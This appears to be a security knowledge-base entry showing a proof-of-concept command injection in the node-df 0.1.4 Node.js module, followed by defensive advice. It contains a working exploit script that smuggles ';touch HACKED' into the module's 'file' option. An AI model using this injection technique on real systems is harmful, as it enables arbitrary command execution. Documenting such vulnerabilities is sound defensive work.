---
id: proc-003
tags:
  - poc
  - rce
  - command-injection
type: procedure
tools:
  - '[[tools/node]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/node-run-poc]]'
verified: false
platforms:
  - Node.js
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:23:24.005Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
  - '[[JavaScript]]'
---
# Create-and-Execute-PoC-Script

## Summary

This procedure creates a JavaScript PoC script that requires the vulnerable node-df module and passes a malicious 'file' option to inject a shell command, then executes it with Node.js to trigger RCE.

## Description

The script exploits the vulnerability at lib/index.js line 36 by setting options.file to '/;touch HACKED', appending ';touch HACKED' to the 'df' command. This runs on Linux via child_process, creating a file as proof of execution. Requires node-df installed and Node.js runtime. Outcome: Arbitrary command execution demonstrated.

## Requirements

1. node-df@0.1.4 installed
2. Node.js executable in PATH
3. Linux shell for command injection

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all user inputs in Node.js modules
- Use safe execution methods like spawn() with shell: false
- Audit third-party dependencies with tools like Snyk or npm audit

## Objectives

1. Inject command via tainted 'file' option
2. Execute arbitrary shell command (touch HACKED)
3. Output disk usage JSON while performing side-effect RCE

## Instructions

### Step 1: Create PoC Script

**Context**: Manually create poc.js with malicious options to exploit the df function.

**Command** (No shell command; use editor):
```javascript
const df = require('node-df');
df('/', { file: '/;touch HACKED', prefixMultiplier: 'GB', isDisplayPrefixMultiplier: true, precision: 2 }, (error, response) => {
  if (error) throw error;
  console.log(JSON.stringify(response));
});
```

> Script content. Expected: File saved as poc.js.

### Step 2: Run the Script

**Context**: Execute the PoC to trigger injection.

**Command** ([[commands/node-run-poc]]):
```bash
node poc.js
```

> Runs the script. Expected output: JSON disk info; 'HACKED' file created.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/node-run-poc]]

## Tools Used

- [[tools/node]]

## Tags

- poc
- rce
- command-injection
